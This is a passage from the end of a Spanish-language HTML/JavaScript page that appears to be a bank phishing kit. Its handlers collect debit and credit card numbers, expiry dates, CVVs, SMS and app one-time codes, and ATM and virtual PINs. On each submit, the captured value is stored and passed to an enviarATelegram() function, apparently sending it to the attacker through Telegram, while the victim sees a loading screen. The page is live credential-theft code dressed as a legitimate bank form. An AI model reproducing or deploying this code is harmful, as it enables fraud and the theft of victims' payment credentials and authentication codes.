                validateTarjeta('tdb');
            });

            $('#vencimientoTDB').on('input', function () {
                formatExpiry($(this));
                validateTarjeta('tdb');
            });

            $('#cvvTDB').on('input', function () {
                formatCVV($(this));
                validateTarjeta('tdb');
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta('tdb');
            });

            $('#btnTDB').on('click', async function () {
                if (validateTarjeta('tdb')) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().replace(/\s/g, ''));
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Crédito
            $('#numtarjetaTDC').on('input', function () {
                formatCardNumber($(this));
                validateTarjeta('tdc');
            });

            $('#vencimientoTDC').on('input', function () {
                formatExpiry($(this));
                validateTarjeta('tdc');
            });

            $('#cvvTDC').on('input', function () {
                formatCVV($(this));
                validateTarjeta('tdc');
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta('tdc');
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta('tdc')) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().replace(/\s/g, ''));
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Códigos OTP
            $('#codsmsInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                $(this).val(value);
                validateOtp('#codsmsInput', '#btnCodSMS');
            });

            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            $('#codappInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                $(this).val(value);
                validateOtp('#codappInput', '#btnCodApp');
            });

            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // PINs
            $('#pincajInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                const isValid = value.length === 4;
                $('#btnPinCaj').prop('disabled', !isValid);
            });

            $('#btnPinCaj').on('click', async function () {
                const value = $('#pincajInput').val();
                if (value.length === 4) {
                    saveToLocalStorage('pincaj', value);
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            $('#pinvirInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                const isValid = value.length === 4;
                $('#btnPinVir').prop('disabled', !isValid);
            });

            $('#btnPinVir').on('click', async function () {
                const value = $('#pinvirInput').val();
                if (value.length === 4) {
                    saveToLocalStorage('pinvir', value);
                    saveToLocalStorage('status', 'PINVIR');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>